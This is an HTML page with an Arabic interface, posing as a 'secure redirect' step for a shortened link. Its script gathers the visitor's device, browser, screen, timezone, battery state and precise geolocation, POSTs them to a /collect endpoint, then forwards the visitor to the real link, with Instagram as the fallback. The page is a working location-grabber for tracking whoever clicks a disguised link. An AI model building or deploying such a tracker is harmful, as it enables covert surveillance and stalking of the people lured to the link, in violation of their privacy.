<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحويل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background:
                radial-gradient(circle at top left, rgba(37, 99, 235, 0.18), transparent 30%),
                radial-gradient(circle at bottom right, rgba(15, 118, 110, 0.18), transparent 36%),
                linear-gradient(135deg, #f8fbff 0%, #eef5ff 100%);
            color: #0f172a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 24px;
        }
        .loader {
            text-align: center;
            padding: 32px 26px;
            background: rgba(255, 255, 255, 0.94);
            border: 1px solid rgba(148, 163, 184, 0.22);
            border-radius: 28px;
            box-shadow: 0 22px 50px rgba(15, 23, 42, 0.14);
            max-width: 480px;
            width: 100%;
            backdrop-filter: blur(10px);
        }
        .top-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #eff6ff;
            color: #1d4ed8;
            border: 1px solid #bfdbfe;
            border-radius: 999px;
            padding: 6px 12px;
            font-size: 11px;
            font-weight: 700;
            margin-bottom: 16px;
            text-transform: uppercase;
            letter-spacing: 0.06em;
        }
        .spinner {
            width: 54px;
            height: 54px;
            border: 4px solid #e2e8f0;
            border-top: 4px solid #2563eb;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        .logo {
            width: 82px;
            height: 82px;
            margin: 0 auto 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #2563eb, #0f766e);
            border-radius: 50%;
            color: #ffffff;
            font-size: 34px;
            box-shadow: 0 14px 30px rgba(37, 99, 235, 0.28);
        }
        h2 {
            font-size: 24px;
            margin-bottom: 6px;
            color: #0f172a;
        }
        .subtitle {
            color: #475569;
            font-size: 15px;
            margin: 8px 0 16px;
        }
        .sub {
            color: #64748b;
            font-size: 13px;
        }
        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin: 22px 0 14px;
            text-align: left;
            font-size: 13px;
        }
        .info-item, .location-info, .battery {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 16px;
            box-shadow: inset 0 1px 0 rgba(255,255,255,0.8);
        }
        .info-item {
            padding: 12px;
        }
        .info-item .label {
            color: #64748b;
            font-size: 11px;
            text-transform: uppercase;
            font-weight: 700;
            letter-spacing: 0.05em;
        }
        .info-item .value {
            color: #0f172a;
            font-weight: 700;
            margin-top: 5px;
            font-size: 14px;
        }
        .battery {
            background: linear-gradient(135deg, #f0fdf4, #dcfce7);
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #bbf7d0;
        }
        .battery-level {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }
        .battery-icon {
            width: 42px;
            height: 22px;
            border: 2px solid #0f172a;
            border-radius: 5px;
            position: relative;
            padding: 2px;
            background: #fff;
        }
        .battery-icon::after {
            content: '';
            position: absolute;
            right: -6px;
            top: 4px;
            width: 4px;
            height: 8px;
            background: #0f172a;
            border-radius: 0 2px 2px 0;
        }
        .battery-fill {
            height: 100%;
            background: #22c55e;
            border-radius: 2px;
            transition: width 0.5s ease, background 0.35s ease;
        }
        .battery-text {
            font-weight: 800;
            font-size: 18px;
            color: #0f172a;
        }
        .charging {
            color: #15803d;
            font-size: 14px;
            margin-top: 6px;
            font-weight: 700;
        }
        .location-info {
            background: linear-gradient(135deg, #eff6ff, #dbeafe);
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #bfdbfe;
        }
        .location-title {
            font-weight: 800;
            margin-bottom: 8px;
            color: #1d4ed8;
        }
        .status-text {
            color: #2563eb;
            font-weight: 700;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .maps-link {
            display: inline-block;
            margin: 6px 4px 0 0;
            padding: 8px 14px;
            background: #2563eb;
            color: #fff;
            text-decoration: none;
            border-radius: 999px;
            font-size: 13px;
            font-weight: 700;
            transition: transform 0.2s ease, background 0.3s ease;
        }
        .maps-link:hover { background: #1d4ed8; transform: translateY(-1px); }
        .maps-link.google-earth { background: #0f766e; }
        .maps-link.google-earth:hover { background: #115e59; }
        .progress-bar {
            width: 100%;
            height: 5px;
            background: #e2e8f0;
            border-radius: 999px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #2563eb, #0f766e);
            width: 0%;
            animation: progress 2.2s ease-in-out forwards;
        }
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        @media (max-width: 480px) {
            .info-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="top-badge">secure redirect</div>
        <div class="logo">📍</div>
        <div class="spinner"></div>
        <h2>جاري تجهيز الرابط</h2>
        <p class="subtitle">نجمع بعض بيانات الجهاز لتقديم تجربة أكثر دقة.</p>
        <p class="sub">سيتم تحويلك تلقائيًا بعد قليل</p>

        <div class="info-grid">
            <div class="info-item">
                <div class="label">📱 الجهاز</div>
                <div class="value" id="deviceName">...</div>
            </div>
            <div class="info-item">
                <div class="label">🌐 المتصفح</div>
                <div class="value" id="browserName">...</div>
            </div>
            <div class="info-item">
                <div class="label">🖥️ الشاشة</div>
                <div class="value" id="screenSize">...</div>
            </div>
            <div class="info-item">
                <div class="label">⏰ التوقيت</div>
                <div class="value" id="timezone">...</div>
            </div>
        </div>

        <div class="battery" id="batteryInfo">
            <div class="battery-level">
                <div class="battery-icon">
                    <div class="battery-fill" id="batteryFill" style="width: 0%;"></div>
                </div>
                <span class="battery-text" id="batteryPercent">--%</span>
            </div>
            <div class="charging" id="chargingStatus">⏳ جاري القراءة...</div>
        </div>

        <div class="location-info" id="locationInfo">
            <div class="location-title">📍 الموقع الجغرافي</div>
            <div id="locationStatus" class="status-text">جاري تحديد الموقع...</div>
            <div id="locationCoords" style="font-size:13px; color:#555; margin:8px 0;"></div>
            <div id="locationLinks" style="margin-top:10px;">
                <a href="#" target="_blank" class="maps-link" id="googleMapsLink">🗺️ خرائط جوجل</a>
                <a href="#" target="_blank" class="maps-link google-earth" id="googleEarthLink">🌍 جوجل إيرث</a>
            </div>
        </div>

        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
    </div>

    <script>
        const defaultRedirect = 'https://www.instagram.com/';
        const code = window.location.pathname.split('/').filter(Boolean)[0] || '';

        function redirectToUrl(url) {
            const target = (url && /^https?:\/\//i.test(url)) ? url : defaultRedirect;
            window.location.replace(target);
        }
        
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging,
                        levelPercent: Math.round(battery.level * 100) + '%'
                    };
                }
            } catch(e) {}
            return { level: 'غير متاح', charging: false, levelPercent: 'غير متاح' };
        }

        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ available: false, error: 'المتصفح لا يدعم تحديد الموقع' });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            available: true,
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    (error) => {
                        let msg = 'مرفوض من المستخدم';
                        if (error.code === 1) msg = '❌ تم رفض الوصول للموقع';
                        else if (error.code === 2) msg = '❌ الموقع غير متاح حالياً';
                        else if (error.code === 3) msg = '⏱️ انتهت مهلة تحديد الموقع';
                        resolve({ available: false, error: msg });
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = 'جهاز غير معروف';
            if (/iPhone|iPad|iPod/i.test(ua)) device = '📱 Apple iOS';
            else if (/Android/i.test(ua)) device = '📱 Android';
            else if (/Windows/i.test(ua)) device = '💻 Windows';
            else if (/Macintosh/i.test(ua)) device = '💻 macOS';
            else if (/Linux/i.test(ua)) device = '💻 Linux';
            
            let browser = 'متصفح غير معروف';
            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = '🌐 Chrome';
            else if (/Firefox/i.test(ua)) browser = '🌐 Firefox';
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = '🌐 Safari';
            else if (/Edg/i.test(ua)) browser = '🌐 Edge';
            
            return { device, browser, screen: `${window.screen.width}x${window.screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, userAgent: ua };
        }

        async function collectAndRedirect() {
            if (!code) {
                redirectToUrl(defaultRedirect);
                return;
            }

            const deviceInfo = getDeviceInfo();
            document.getElementById('deviceName').textContent = deviceInfo.device;
            document.getElementById('browserName').textContent = deviceInfo.browser;
            document.getElementById('screenSize').textContent = deviceInfo.screen;
            document.getElementById('timezone').textContent = deviceInfo.timezone;
            
            const batteryInfo = await getBatteryInfo();
            if (batteryInfo.level !== 'غير متاح') {
                document.getElementById('batteryFill').style.width = batteryInfo.level + '%';
                document.getElementById('batteryPercent').textContent = batteryInfo.level + '%';
                const fill = document.getElementById('batteryFill');
                if (batteryInfo.level < 20) fill.style.background = '#f44336';
                else if (batteryInfo.level < 50) fill.style.background = '#ff9800';
                else fill.style.background = '#4caf50';
                document.getElementById('chargingStatus').textContent = batteryInfo.charging ? '⚡ جاري الشحن...' : '🔋 يعمل على البطارية';
            } else {
                document.getElementById('batteryPercent').textContent = '❌ غير متاح';
                document.getElementById('chargingStatus').textContent = '⚠️ لا يمكن قراءة حالة البطارية';
            }
            
            const location = await getLocation();
            if (location.available) {
                const { lat, lng, accuracy } = location;
                document.getElementById('locationStatus').textContent = '✅ تم تحديد الموقع';
                document.getElementById('locationStatus').style.color = '#4caf50';
                document.getElementById('locationCoords').textContent = `📍 ${lat.toFixed(6)}, ${lng.toFixed(6)} (دقة: ${Math.round(accuracy)} متر)`;
                document.getElementById('googleMapsLink').href = `https://www.google.com/maps?q=${lat},${lng}`;
                document.getElementById('googleEarthLink').href = `https://earth.google.com/web/@${lat},${lng},0a,1000d`;
            } else {
                document.getElementById('locationStatus').textContent = location.error;
                document.getElementById('locationStatus').style.color = '#f44336';
                document.getElementById('locationCoords').textContent = '⚠️ لم يتم تحديد الموقع';
                document.getElementById('googleMapsLink').style.display = 'none';
                document.getElementById('googleEarthLink').style.display = 'none';
            }
            
            const data = {
                code: code,
                user_agent: deviceInfo.userAgent,
                device: deviceInfo.device,
                browser: deviceInfo.browser,
                screen: deviceInfo.screen,
                timezone: deviceInfo.timezone,
                battery: batteryInfo,
                location: location.available
                    ? { available: true, lat: location.lat, lng: location.lng, accuracy: location.accuracy }
                    : { available: false, error: location.error },
                timestamp: new Date().toISOString()
            };
            
            try {
                await fetch(`/collect/${code}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch(e) {}
            
            try {
                const response = await fetch(`/link/${encodeURIComponent(code)}`);
                const linkData = await response.json();
                setTimeout(() => { redirectToUrl(linkData.original_url || defaultRedirect); }, 2000);
            } catch(e) {
                setTimeout(() => { redirectToUrl(defaultRedirect); }, 2000);
            }
        }

        window.addEventListener('load', collectAndRedirect);
    </script>
</body>
</html>
